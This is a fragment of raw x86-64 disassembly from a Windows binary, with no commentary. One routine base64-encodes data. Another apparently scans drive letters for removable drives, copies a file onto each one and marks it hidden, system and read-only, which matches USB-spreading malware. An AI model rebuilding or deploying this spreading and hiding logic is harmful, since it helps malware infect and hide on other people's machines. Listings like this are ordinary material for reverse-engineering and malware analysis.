  4044d3:	4c 89 f6             	mov    %r14,%rsi
  4044d6:	f3 a5                	rep movsl (%rsi),(%rdi)
  4044d8:	48 89 d9             	mov    %rbx,%rcx
  4044db:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
  4044e2:	00 
  4044e3:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
  4044ea:	00 00 
  4044ec:	ff 10                	call   *(%rax)
  4044ee:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
  4044f3:	45 31 c0             	xor    %r8d,%r8d
  4044f6:	48 89 d9             	mov    %rbx,%rcx
  4044f9:	44 8b 4c 24 5c       	mov    0x5c(%rsp),%r9d
  4044fe:	4c 89 ea             	mov    %r13,%rdx
  404501:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
  404506:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
  40450d:	00 
  40450e:	48 83 c0 10          	add    $0x10,%rax
  404512:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  404517:	48 8b 05 72 2d 01 00 	mov    0x12d72(%rip),%rax        # 0x417290
  40451e:	ff 10                	call   *(%rax)
  404520:	48 8b 05 79 2d 01 00 	mov    0x12d79(%rip),%rax        # 0x4172a0
  404527:	4c 89 fa             	mov    %r15,%rdx
  40452a:	48 89 d9             	mov    %rbx,%rcx
  40452d:	ff 10                	call   *(%rax)
  40452f:	48 8b 05 3a 2d 01 00 	mov    0x12d3a(%rip),%rax        # 0x417270
  404536:	48 89 d9             	mov    %rbx,%rcx
  404539:	ff 10                	call   *(%rax)
  40453b:	48 8b 05 9e 2d 01 00 	mov    0x12d9e(%rip),%rax        # 0x4172e0
  404542:	4c 89 e2             	mov    %r12,%rdx
  404545:	31 c9                	xor    %ecx,%ecx
  404547:	ff 10                	call   *(%rax)
  404549:	48 8b 05 30 2d 01 00 	mov    0x12d30(%rip),%rax        # 0x417280
  404550:	4c 89 e9             	mov    %r13,%rcx
  404553:	ff 10                	call   *(%rax)
  404555:	8b 7c 24 58          	mov    0x58(%rsp),%edi
  404559:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
  40455e:	ba 18 00 00 00       	mov    $0x18,%edx
  404563:	8b 74 24 5c          	mov    0x5c(%rsp),%esi
  404567:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
  40456c:	e8 db fb ff ff       	call   0x40414c
  404571:	48 63 cf             	movslq %edi,%rcx
  404574:	31 ff                	xor    %edi,%edi
  404576:	e8 76 11 00 00       	call   0x4056f1
  40457b:	48 63 ce             	movslq %esi,%rcx
  40457e:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
  404583:	e8 69 11 00 00       	call   0x4056f1
  404588:	48 85 db             	test   %rbx,%rbx
  40458b:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
  404590:	74 03                	je     0x404595
  404592:	48 8b 3b             	mov    (%rbx),%rdi
  404595:	48 8d 47 02          	lea    0x2(%rdi),%rax
  404599:	b9 03 00 00 00       	mov    $0x3,%ecx
  40459e:	48 83 c3 10          	add    $0x10,%rbx
  4045a2:	48 99                	cqto
  4045a4:	48 f7 f9             	idiv   %rcx
  4045a7:	48 8d 0c 85 01 00 00 	lea    0x1(,%rax,4),%rcx
  4045ae:	00 
  4045af:	e8 ff 0c 00 00       	call   0x4052b3
  4045b4:	4c 8d 5f fe          	lea    -0x2(%rdi),%r11
  4045b8:	45 31 c9             	xor    %r9d,%r9d
  4045bb:	31 d2                	xor    %edx,%edx
  4045bd:	48 8d 48 10          	lea    0x10(%rax),%rcx
  4045c1:	4c 8d 15 f8 00 01 00 	lea    0x100f8(%rip),%r10        # 0x4146c0
  4045c8:	4d 39 cb             	cmp    %r9,%r11
  4045cb:	0f 8e 92 00 00 00    	jle    0x404663
  4045d1:	46 8a 04 0b          	mov    (%rbx,%r9,1),%r8b
  4045d5:	41 c0 e8 02          	shr    $0x2,%r8b
  4045d9:	41 83 e0 3f          	and    $0x3f,%r8d
  4045dd:	47 8a 84 02 80 00 00 	mov    0x80(%r10,%r8,1),%r8b
  4045e4:	00 
  4045e5:	44 88 04 11          	mov    %r8b,(%rcx,%rdx,1)
  4045e9:	46 8a 04 0b          	mov    (%rbx,%r9,1),%r8b
  4045ed:	42 8a 74 0b 01       	mov    0x1(%rbx,%r9,1),%sil
  4045f2:	41 c1 e0 04          	shl    $0x4,%r8d
  4045f6:	40 c0 ee 04          	shr    $0x4,%sil
  4045fa:	41 83 e0 30          	and    $0x30,%r8d
  4045fe:	41 09 f0             	or     %esi,%r8d
  404601:	41 83 e0 3f          	and    $0x3f,%r8d
  404605:	47 8a 84 02 80 00 00 	mov    0x80(%r10,%r8,1),%r8b
  40460c:	00 
  40460d:	44 88 44 11 01       	mov    %r8b,0x1(%rcx,%rdx,1)
  404612:	42 8a 74 0b 01       	mov    0x1(%rbx,%r9,1),%sil
  404617:	44 8d 04 b5 00 00 00 	lea    0x0(,%rsi,4),%r8d
  40461e:	00 
  40461f:	42 8a 74 0b 02       	mov    0x2(%rbx,%r9,1),%sil
  404624:	41 83 e0 3c          	and    $0x3c,%r8d
  404628:	40 c0 ee 06          	shr    $0x6,%sil
  40462c:	41 09 f0             	or     %esi,%r8d
  40462f:	41 83 e0 3f          	and    $0x3f,%r8d
  404633:	47 8a 84 02 80 00 00 	mov    0x80(%r10,%r8,1),%r8b
  40463a:	00 
  40463b:	44 88 44 11 02       	mov    %r8b,0x2(%rcx,%rdx,1)
  404640:	46 8a 44 0b 02       	mov    0x2(%rbx,%r9,1),%r8b
  404645:	49 83 c1 03          	add    $0x3,%r9
  404649:	41 83 e0 3f          	and    $0x3f,%r8d
  40464d:	47 8a 84 02 80 00 00 	mov    0x80(%r10,%r8,1),%r8b
  404654:	00 
  404655:	44 88 44 11 03       	mov    %r8b,0x3(%rcx,%rdx,1)
  40465a:	48 83 c2 04          	add    $0x4,%rdx
  40465e:	e9 65 ff ff ff       	jmp    0x4045c8
  404663:	4c 39 cf             	cmp    %r9,%rdi
  404666:	0f 8e 91 00 00 00    	jle    0x4046fd
  40466c:	4a 8d 34 0b          	lea    (%rbx,%r9,1),%rsi
  404670:	48 ff cf             	dec    %rdi
  404673:	44 8a 06             	mov    (%rsi),%r8b
  404676:	4c 8d 15 43 00 01 00 	lea    0x10043(%rip),%r10        # 0x4146c0
  40467d:	4c 8d 5a 01          	lea    0x1(%rdx),%r11
  404681:	41 c0 e8 02          	shr    $0x2,%r8b
  404685:	41 83 e0 3f          	and    $0x3f,%r8d
  404689:	49 39 f9             	cmp    %rdi,%r9
  40468c:	47 8a 84 02 80 00 00 	mov    0x80(%r10,%r8,1),%r8b
  404693:	00 
  404694:	44 88 44 10 10       	mov    %r8b,0x10(%rax,%rdx,1)
  404699:	44 8a 06             	mov    (%rsi),%r8b
  40469c:	75 1b                	jne    0x4046b9
  40469e:	41 c1 e0 04          	shl    $0x4,%r8d
  4046a2:	48 83 c2 02          	add    $0x2,%rdx
  4046a6:	41 83 e0 30          	and    $0x30,%r8d
  4046aa:	43 8a 8c 02 80 00 00 	mov    0x80(%r10,%r8,1),%cl
  4046b1:	00 
  4046b2:	42 88 4c 18 10       	mov    %cl,0x10(%rax,%r11,1)
  4046b7:	eb 44                	jmp    0x4046fd
  4046b9:	4a 8d 5c 0b 01       	lea    0x1(%rbx,%r9,1),%rbx
  4046be:	41 c1 e0 04          	shl    $0x4,%r8d
  4046c2:	44 8a 0b             	mov    (%rbx),%r9b
  4046c5:	41 83 e0 30          	and    $0x30,%r8d
  4046c9:	41 c0 e9 04          	shr    $0x4,%r9b
  4046cd:	45 09 c8             	or     %r9d,%r8d
  4046d0:	41 83 e0 3f          	and    $0x3f,%r8d
  4046d4:	47 8a 84 02 80 00 00 	mov    0x80(%r10,%r8,1),%r8b
  4046db:	00 
  4046dc:	46 88 44 18 10       	mov    %r8b,0x10(%rax,%r11,1)
  4046e1:	44 8a 03             	mov    (%rbx),%r8b
  4046e4:	41 c1 e0 02          	shl    $0x2,%r8d
  4046e8:	41 83 e0 3c          	and    $0x3c,%r8d
  4046ec:	47 8a 84 02 80 00 00 	mov    0x80(%r10,%r8,1),%r8b
  4046f3:	00 
  4046f4:	44 88 44 11 02       	mov    %r8b,0x2(%rcx,%rdx,1)
  4046f9:	48 83 c2 03          	add    $0x3,%rdx
  4046fd:	48 89 c1             	mov    %rax,%rcx
  404700:	e8 c4 0b 00 00       	call   0x4052c9
  404705:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
  40470a:	31 c9                	xor    %ecx,%ecx
  40470c:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
  404711:	48 85 d2             	test   %rdx,%rdx
  404714:	74 03                	je     0x404719
  404716:	48 8b 0a             	mov    (%rdx),%rcx
  404719:	4c 8b 44 24 70       	mov    0x70(%rsp),%r8
  40471e:	48 83 c1 02          	add    $0x2,%rcx
  404722:	31 d2                	xor    %edx,%edx
  404724:	4d 85 c0             	test   %r8,%r8
  404727:	74 03                	je     0x40472c
  404729:	49 8b 10             	mov    (%r8),%rdx
  40472c:	48 01 d1             	add    %rdx,%rcx
  40472f:	48 85 c0             	test   %rax,%rax
  404732:	74 03                	je     0x404737
  404734:	48 8b 00             	mov    (%rax),%rax
  404737:	48 01 c1             	add    %rax,%rcx
  40473a:	e8 41 0b 00 00       	call   0x405280
  40473f:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
  404744:	31 d2                	xor    %edx,%edx
  404746:	4d 85 c0             	test   %r8,%r8
  404749:	74 03                	je     0x40474e
  40474b:	49 8b 10             	mov    (%r8),%rdx
  40474e:	48 89 c1             	mov    %rax,%rcx
  404751:	e8 c8 09 00 00       	call   0x40511e
  404756:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
  40475b:	48 89 c3             	mov    %rax,%rbx
  40475e:	48 89 c1             	mov    %rax,%rcx
  404761:	e8 c1 18 00 00       	call   0x406027
  404766:	48 89 d9             	mov    %rbx,%rcx
  404769:	ba 01 00 00 00       	mov    $0x1,%edx
  40476e:	e8 ab 09 00 00       	call   0x40511e
  404773:	48 8d 15 06 00 01 00 	lea    0x10006(%rip),%rdx        # 0x414780
  40477a:	48 89 c1             	mov    %rax,%rcx
  40477d:	48 89 c3             	mov    %rax,%rbx
  404780:	e8 a2 18 00 00       	call   0x406027
  404785:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
  40478a:	31 d2                	xor    %edx,%edx
  40478c:	48 85 c0             	test   %rax,%rax
  40478f:	74 03                	je     0x404794
  404791:	48 8b 10             	mov    (%rax),%rdx
  404794:	48 89 d9             	mov    %rbx,%rcx
  404797:	e8 82 09 00 00       	call   0x40511e
  40479c:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
  4047a1:	48 89 c3             	mov    %rax,%rbx
  4047a4:	48 89 c1             	mov    %rax,%rcx
  4047a7:	e8 7b 18 00 00       	call   0x406027
  4047ac:	48 89 d9             	mov    %rbx,%rcx
  4047af:	ba 01 00 00 00       	mov    $0x1,%edx
  4047b4:	e8 65 09 00 00       	call   0x40511e
  4047b9:	48 8d 15 c0 ff 00 00 	lea    0xffc0(%rip),%rdx        # 0x414780
  4047c0:	48 89 c1             	mov    %rax,%rcx
  4047c3:	48 89 c3             	mov    %rax,%rbx
  4047c6:	e8 5c 18 00 00       	call   0x406027
  4047cb:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
  4047d0:	31 d2                	xor    %edx,%edx
  4047d2:	48 85 c0             	test   %rax,%rax
  4047d5:	74 03                	je     0x4047da
  4047d7:	48 8b 10             	mov    (%rax),%rdx
  4047da:	48 89 d9             	mov    %rbx,%rcx
  4047dd:	e8 3c 09 00 00       	call   0x40511e
  4047e2:	48 8b 54 24 78       	mov    0x78(%rsp),%rdx
  4047e7:	48 89 c3             	mov    %rax,%rbx
  4047ea:	48 89 c1             	mov    %rax,%rcx
  4047ed:	e8 35 18 00 00       	call   0x406027
  4047f2:	48 8d 0d 2f 2d 02 00 	lea    0x22d2f(%rip),%rcx        # 0x427528
  4047f9:	48 89 da             	mov    %rbx,%rdx
  4047fc:	e8 5b f9 ff ff       	call   0x40415c
  404801:	48 8b 1d f8 31 01 00 	mov    0x131f8(%rip),%rbx        # 0x417a00
  404808:	48 8d 4b 30          	lea    0x30(%rbx),%rcx
  40480c:	ff 15 52 6b 03 00    	call   *0x36b52(%rip)        # 0x43b364
  404812:	45 31 c9             	xor    %r9d,%r9d
  404815:	45 31 c0             	xor    %r8d,%r8d
  404818:	31 d2                	xor    %edx,%edx
  40481a:	48 8b 05 5f 28 01 00 	mov    0x1285f(%rip),%rax        # 0x417080
  404821:	31 c9                	xor    %ecx,%ecx
  404823:	ff 10                	call   *(%rax)
  404825:	48 8d 15 ae e3 ff ff 	lea    -0x1c52(%rip),%rdx        # 0x402bda
  40482c:	48 c7 43 18 ff ff ff 	movq   $0xffffffffffffffff,0x18(%rbx)
  404833:	ff 
  404834:	48 89 43 58          	mov    %rax,0x58(%rbx)
  404838:	48 8d 0d d1 2c 02 00 	lea    0x22cd1(%rip),%rcx        # 0x427510
  40483f:	48 c7 43 20 00 00 00 	movq   $0x0,0x20(%rbx)
  404846:	00 
  404847:	e8 64 48 00 00       	call   0x4090b0
  40484c:	48 8d 15 6a 21 00 00 	lea    0x216a(%rip),%rdx        # 0x4069bd
  404853:	48 8d 0d 96 2c 02 00 	lea    0x22c96(%rip),%rcx        # 0x4274f0
  40485a:	e8 51 48 00 00       	call   0x4090b0
  40485f:	48 8d 15 b5 01 00 00 	lea    0x1b5(%rip),%rdx        # 0x404a1b
  404866:	48 8d 0d 63 2c 02 00 	lea    0x22c63(%rip),%rcx        # 0x4274d0
  40486d:	e8 3e 48 00 00       	call   0x4090b0
  404872:	48 8b 35 17 29 01 00 	mov    0x12917(%rip),%rsi        # 0x417190
  404879:	48 8b 3d 5c 6b 03 00 	mov    0x36b5c(%rip),%rdi        # 0x43b3dc
  404880:	4c 8b 25 e5 6a 03 00 	mov    0x36ae5(%rip),%r12        # 0x43b36c
  404887:	b9 0a 00 00 00       	mov    $0xa,%ecx
  40488c:	ff 16                	call   *(%rsi)
  40488e:	31 d2                	xor    %edx,%edx
  404890:	c6 05 29 2c 02 00 00 	movb   $0x0,0x22c29(%rip)        # 0x4274c0
  404897:	48 8d 0d 2a 2c 02 00 	lea    0x22c2a(%rip),%rcx        # 0x4274c8
  40489e:	e8 d6 0a 00 00       	call   0x405379
  4048a3:	31 d2                	xor    %edx,%edx
  4048a5:	c6 05 14 2c 02 00 00 	movb   $0x0,0x22c14(%rip)        # 0x4274c0
  4048ac:	48 8d 0d 15 2c 02 00 	lea    0x22c15(%rip),%rcx        # 0x4274c8
  4048b3:	e8 c1 0a 00 00       	call   0x405379
  4048b8:	48 83 7b 18 fe       	cmpq   $0xfffffffffffffffe,0x18(%rbx)
  4048bd:	0f 84 1d 01 00 00    	je     0x4049e0
  4048c3:	48 8d 4b 30          	lea    0x30(%rbx),%rcx
  4048c7:	ff d7                	call   *%rdi
  4048c9:	85 c0                	test   %eax,%eax
  4048cb:	0f 84 0f 01 00 00    	je     0x4049e0
  4048d1:	48 83 7b 10 00       	cmpq   $0x0,0x10(%rbx)
  4048d6:	0f 8e fd 00 00 00    	jle    0x4049d9
  4048dc:	c6 43 68 01          	movb   $0x1,0x68(%rbx)
  4048e0:	4c 8d 6b 58          	lea    0x58(%rbx),%r13
  4048e4:	48 8b 43 10          	mov    0x10(%rbx),%rax
  4048e8:	48 85 c0             	test   %rax,%rax
  4048eb:	7f 0a                	jg     0x4048f7
  4048ed:	4c 89 e9             	mov    %r13,%rcx
  4048f0:	e8 7c 25 00 00       	call   0x406e71
  4048f5:	eb ed                	jmp    0x4048e4
  4048f7:	4c 8b 05 82 2c 01 00 	mov    0x12c82(%rip),%r8        # 0x417580
  4048fe:	c6 43 68 00          	movb   $0x0,0x68(%rbx)
  404902:	4c 39 43 60          	cmp    %r8,0x60(%rbx)
  404906:	74 7a                	je     0x404982
  404908:	48 8d 4b 30          	lea    0x30(%rbx),%rcx
  40490c:	ff 15 5a 6a 03 00    	call   *0x36a5a(%rip)        # 0x43b36c
  404912:	48 8b 0d 17 2d 01 00 	mov    0x12d17(%rip),%rcx        # 0x417630
  404919:	ba 30 00 00 00       	mov    $0x30,%edx
  40491e:	e8 1f 09 00 00       	call   0x405242
  404923:	48 8d 0d 76 fe 00 00 	lea    0xfe76(%rip),%rcx        # 0x4147a0
  40492a:	48 89 c3             	mov    %rax,%rbx
  40492d:	48 8b 05 dc 2d 01 00 	mov    0x12ddc(%rip),%rax        # 0x417710
  404934:	48 8b 73 18          	mov    0x18(%rbx),%rsi
  404938:	48 89 03             	mov    %rax,(%rbx)
  40493b:	48 8d 05 9e fb 00 00 	lea    0xfb9e(%rip),%rax        # 0x4144e0
  404942:	48 89 43 10          	mov    %rax,0x10(%rbx)
  404946:	e8 4f 08 00 00       	call   0x40519a
  40494b:	48 85 f6             	test   %rsi,%rsi
  40494e:	48 89 43 18          	mov    %rax,0x18(%rbx)
  404952:	74 08                	je     0x40495c
  404954:	48 89 f1             	mov    %rsi,%rcx
  404957:	e8 a4 93 00 00       	call   0x40dd00
  40495c:	48 c7 44 24 20 31 00 	movq   $0x31,0x20(%rsp)
  404963:	00 00 
  404965:	4c 8d 0d 7f fb 00 00 	lea    0xfb7f(%rip),%r9        # 0x4144eb
  40496c:	48 89 d9             	mov    %rbx,%rcx
  40496f:	4c 8d 05 7f fb 00 00 	lea    0xfb7f(%rip),%r8        # 0x4144f5
  404976:	48 8d 15 63 fb 00 00 	lea    0xfb63(%rip),%rdx        # 0x4144e0
  40497d:	e8 33 12 00 00       	call   0x405bb5
  404982:	48 8b 13             	mov    (%rbx),%rdx
  404985:	48 ff c8             	dec    %rax
  404988:	41 b9 01 00 00 00    	mov    $0x1,%r9d
  40498e:	49 0f af 10          	imul   (%r8),%rdx
  404992:	48 89 43 10          	mov    %rax,0x10(%rbx)
  404996:	48 03 53 28          	add    0x28(%rbx),%rdx
  40499a:	48 8d 0d 27 2b 02 00 	lea    0x22b27(%rip),%rcx        # 0x4274c8
  4049a1:	e8 ff 24 00 00       	call   0x406ea5
  4049a6:	48 8b 03             	mov    (%rbx),%rax
  4049a9:	48 ff c0             	inc    %rax
  4049ac:	48 23 43 18          	and    0x18(%rbx),%rax
  4049b0:	48 89 03             	mov    %rax,(%rbx)
  4049b3:	48 8b 43 20          	mov    0x20(%rbx),%rax
  4049b7:	48 85 c0             	test   %rax,%rax
  4049ba:	7e 16                	jle    0x4049d2
  4049bc:	48 ff c8             	dec    %rax
  4049bf:	48 39 43 10          	cmp    %rax,0x10(%rbx)
  4049c3:	75 0d                	jne    0x4049d2
  4049c5:	48 8b 05 d4 26 01 00 	mov    0x126d4(%rip),%rax        # 0x4170a0
  4049cc:	48 8b 4b 58          	mov    0x58(%rbx),%rcx
  4049d0:	ff 10                	call   *(%rax)
  4049d2:	c6 05 e7 2a 02 00 01 	movb   $0x1,0x22ae7(%rip)        # 0x4274c0
  4049d9:	48 8d 4b 30          	lea    0x30(%rbx),%rcx
  4049dd:	41 ff d4             	call   *%r12
  4049e0:	80 3d d9 2a 02 00 00 	cmpb   $0x0,0x22ad9(%rip)        # 0x4274c0
  4049e7:	0f 84 9a fe ff ff    	je     0x404887
  4049ed:	ba 08 00 00 00       	mov    $0x8,%edx
  4049f2:	48 89 e9             	mov    %rbp,%rcx
  4049f5:	e8 52 f7 ff ff       	call   0x40414c
  4049fa:	48 8b 0d c7 2a 02 00 	mov    0x22ac7(%rip),%rcx        # 0x4274c8
  404a01:	e8 d7 41 00 00       	call   0x408bdd
  404a06:	48 89 e9             	mov    %rbp,%rcx
  404a09:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
  404a10:	00 
  404a11:	e8 a5 23 00 00       	call   0x406dbb
  404a16:	e9 6c fe ff ff       	jmp    0x404887
  404a1b:	41 57                	push   %r15
  404a1d:	41 56                	push   %r14
  404a1f:	41 55                	push   %r13
  404a21:	41 54                	push   %r12
  404a23:	55                   	push   %rbp
  404a24:	57                   	push   %rdi
  404a25:	56                   	push   %rsi
  404a26:	53                   	push   %rbx
  404a27:	48 83 ec 58          	sub    $0x58,%rsp
  404a2b:	48 8b 05 7e 29 01 00 	mov    0x1297e(%rip),%rax        # 0x4173b0
  404a32:	31 c9                	xor    %ecx,%ecx
  404a34:	31 ff                	xor    %edi,%edi
  404a36:	ff 10                	call   *(%rax)
  404a38:	e8 f3 2e 00 00       	call   0x407930
  404a3d:	48 89 c5             	mov    %rax,%rbp
  404a40:	48 8d 05 69 fb 00 00 	lea    0xfb69(%rip),%rax        # 0x4145b0
  404a47:	b9 03 00 00 00       	mov    $0x3,%ecx
  404a4c:	40 8a 34 38          	mov    (%rax,%rdi,1),%sil
  404a50:	e8 2b 08 00 00       	call   0x405280
  404a55:	48 8d 15 14 fb 00 00 	lea    0xfb14(%rip),%rdx        # 0x414570
  404a5c:	48 89 c3             	mov    %rax,%rbx
  404a5f:	48 8b 00             	mov    (%rax),%rax
  404a62:	48 89 d9             	mov    %rbx,%rcx
  404a65:	40 88 74 03 10       	mov    %sil,0x10(%rbx,%rax,1)
  404a6a:	c6 44 03 11 00       	movb   $0x0,0x11(%rbx,%rax,1)
  404a6f:	48 ff c0             	inc    %rax
  404a72:	48 89 03             	mov    %rax,(%rbx)
  404a75:	e8 ad 15 00 00       	call   0x406027
  404a7a:	48 89 d9             	mov    %rbx,%rcx
  404a7d:	e8 26 e0 ff ff       	call   0x402aa8
  404a82:	48 89 c1             	mov    %rax,%rcx
  404a85:	48 8b 05 64 27 01 00 	mov    0x12764(%rip),%rax        # 0x4171f0
  404a8c:	ff 10                	call   *(%rax)
  404a8e:	83 f8 02             	cmp    $0x2,%eax
  404a91:	0f 85 f8 01 00 00    	jne    0x404c8f
  404a97:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
  404a9e:	00 00 
  404aa0:	48 89 d9             	mov    %rbx,%rcx
  404aa3:	e8 00 e0 ff ff       	call   0x402aa8
  404aa8:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
  404aad:	45 31 c9             	xor    %r9d,%r9d
  404ab0:	45 31 c0             	xor    %r8d,%r8d
  404ab3:	48 89 c1             	mov    %rax,%rcx
  404ab6:	48 8b 05 53 27 01 00 	mov    0x12753(%rip),%rax        # 0x417210
  404abd:	ff 10                	call   *(%rax)
  404abf:	48 81 7c 24 48 7f 84 	cmpq   $0x1e847f,0x48(%rsp)
  404ac6:	1e 00 
  404ac8:	0f 8e c1 01 00 00    	jle    0x404c8f
  404ace:	b9 0a 02 00 00       	mov    $0x20a,%ecx
  404ad3:	e8 db 07 00 00       	call   0x4052b3
  404ad8:	48 89 c1             	mov    %rax,%rcx
  404adb:	e8 24 df ff ff       	call   0x402a04
  404ae0:	48 89 d9             	mov    %rbx,%rcx
  404ae3:	48 89 c6             	mov    %rax,%rsi
  404ae6:	e8 bd df ff ff       	call   0x402aa8
  404aeb:	45 31 c9             	xor    %r9d,%r9d
  404aee:	48 89 f2             	mov    %rsi,%rdx
  404af1:	41 b8 04 01 00 00    	mov    $0x104,%r8d
  404af7:	48 89 c1             	mov    %rax,%rcx
  404afa:	48 8b 05 ff 26 01 00 	mov    0x126ff(%rip),%rax        # 0x417200
  404b01:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
  404b08:	00 
  404b09:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
  404b10:	00 00 
  404b12:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
  404b19:	00 00 
  404b1b:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
  404b22:	00 00 
  404b24:	ff 10                	call   *(%rax)
  404b26:	48 8b 05 f3 27 01 00 	mov    0x127f3(%rip),%rax        # 0x417320
  404b2d:	48 89 f1             	mov    %rsi,%rcx
  404b30:	ff 10                	call   *(%rax)
  404b32:	48 85 f6             	test   %rsi,%rsi
  404b35:	41 89 c6             	mov    %eax,%r14d
  404b38:	75 14                	jne    0x404b4e
  404b3a:	48 8d 0d 0f fa 00 00 	lea    0xfa0f(%rip),%rcx        # 0x414550
  404b41:	e8 97 40 00 00       	call   0x408bdd
  404b46:	49 89 c5             	mov    %rax,%r13
  404b49:	e9 92 00 00 00       	jmp    0x404be0
  404b4e:	4c 8b 25 eb 27 01 00 	mov    0x127eb(%rip),%r12        # 0x417340
  404b55:	31 d2                	xor    %edx,%edx
  404b57:	41 89 c1             	mov    %eax,%r9d
  404b5a:	49 89 f0             	mov    %rsi,%r8
  404b5d:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
  404b62:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
  404b69:	00 
  404b6a:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
  404b71:	00 00 
  404b73:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
  404b7a:	00 00 
  404b7c:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
  404b83:	00 00 
  404b85:	41 ff 14 24          	call   *(%r12)
  404b89:	48 63 c8             	movslq %eax,%rcx
  404b8c:	49 89 cf             	mov    %rcx,%r15
  404b8f:	e8 1f 07 00 00       	call   0x4052b3
  404b94:	48 89 c1             	mov    %rax,%rcx
  404b97:	49 89 c5             	mov    %rax,%r13
  404b9a:	e8 65 de ff ff       	call   0x402a04
  404b9f:	31 d2                	xor    %edx,%edx
  404ba1:	44 89 7c 24 28       	mov    %r15d,0x28(%rsp)
  404ba6:	45 89 f1             	mov    %r14d,%r9d
  404ba9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  404bae:	49 89 f0             	mov    %rsi,%r8
  404bb1:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
  404bb6:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
  404bbd:	00 00 
  404bbf:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
  404bc6:	00 00 
  404bc8:	41 ff 14 24          	call   *(%r12)
  404bcc:	4d 85 ed             	test   %r13,%r13
  404bcf:	0f 84 65 ff ff ff    	je     0x404b3a
  404bd5:	49 83 7d 00 00       	cmpq   $0x0,0x0(%r13)
  404bda:	0f 84 5a ff ff ff    	je     0x404b3a
  404be0:	48 8d 15 49 f9 00 00 	lea    0xf949(%rip),%rdx        # 0x414530
  404be7:	48 89 d9             	mov    %rbx,%rcx
  404bea:	e8 50 32 00 00       	call   0x407e3f
  404bef:	31 d2                	xor    %edx,%edx
  404bf1:	48 85 c0             	test   %rax,%rax
  404bf4:	49 89 c4             	mov    %rax,%r12
  404bf7:	74 03                	je     0x404bfc
  404bf9:	48 8b 10             	mov    (%rax),%rdx
  404bfc:	31 c0                	xor    %eax,%eax
  404bfe:	4d 85 ed             	test   %r13,%r13
  404c01:	74 04                	je     0x404c07
  404c03:	49 8b 45 00          	mov    0x0(%r13),%rax
  404c07:	48 8d 4c 02 05       	lea    0x5(%rdx,%rax,1),%rcx
  404c0c:	e8 6f 06 00 00       	call   0x405280
  404c11:	4c 89 e2             	mov    %r12,%rdx
  404c14:	48 89 c6             	mov    %rax,%rsi
  404c17:	48 89 c1             	mov    %rax,%rcx
  404c1a:	e8 08 14 00 00       	call   0x406027
  404c1f:	4c 89 ea             	mov    %r13,%rdx
  404c22:	48 89 f1             	mov    %rsi,%rcx
  404c25:	e8 fd 13 00 00       	call   0x406027
  404c2a:	48 8d 15 df f8 00 00 	lea    0xf8df(%rip),%rdx        # 0x414510
  404c31:	48 89 f1             	mov    %rsi,%rcx
  404c34:	e8 ee 13 00 00       	call   0x406027
  404c39:	48 89 f1             	mov    %rsi,%rcx
  404c3c:	e8 44 df ff ff       	call   0x402b85
  404c41:	84 c0                	test   %al,%al
  404c43:	75 4a                	jne    0x404c8f
  404c45:	48 89 f2             	mov    %rsi,%rdx
  404c48:	48 89 e9             	mov    %rbp,%rcx
  404c4b:	e8 85 34 00 00       	call   0x4080d5
  404c50:	48 89 f1             	mov    %rsi,%rcx
  404c53:	e8 50 de ff ff       	call   0x402aa8
  404c58:	48 89 c1             	mov    %rax,%rcx
  404c5b:	48 8b 05 be 25 01 00 	mov    0x125be(%rip),%rax        # 0x417220
  404c62:	ff 10                	call   *(%rax)
  404c64:	48 89 f1             	mov    %rsi,%rcx
  404c67:	41 89 c4             	mov    %eax,%r12d
  404c6a:	e8 39 de ff ff       	call   0x402aa8
  404c6f:	44 89 e2             	mov    %r12d,%edx
  404c72:	48 89 c1             	mov    %rax,%rcx
  404c75:	48 8b 05 b4 25 01 00 	mov    0x125b4(%rip),%rax        # 0x417230
  404c7c:	81 ca 07 20 00 00    	or     $0x2007,%edx
  404c82:	ff 10                	call   *(%rax)
  404c84:	48 89 da             	mov    %rbx,%rdx
  404c87:	48 89 f1             	mov    %rsi,%rcx
  404c8a:	e8 c3 13 00 00       	call   0x406052
  404c8f:	48 ff c7             	inc    %rdi
  404c92:	48 83 ff 17          	cmp    $0x17,%rdi
  404c96:	0f 85 a4 fd ff ff    	jne    0x404a40
  404c9c:	48 8b 05 ed 26 01 00 	mov    0x126ed(%rip),%rax        # 0x417390
  404ca3:	ff 10                	call   *(%rax)
  404ca5:	90                   	nop
  404ca6:	48 83 c4 58          	add    $0x58,%rsp
  404caa:	5b                   	pop    %rbx
  404cab:	5e                   	pop    %rsi
  404cac:	5f                   	pop    %rdi
  404cad:	5d                   	pop    %rbp
  404cae:	41 5c                	pop    %r12
  404cb0:	41 5d                	pop    %r13
  404cb2:	41 5e                	pop    %r14
  404cb4:	41 5f                	pop    %r15
  404cb6:	c3                   	ret
  404cb7:	57                   	push   %rdi
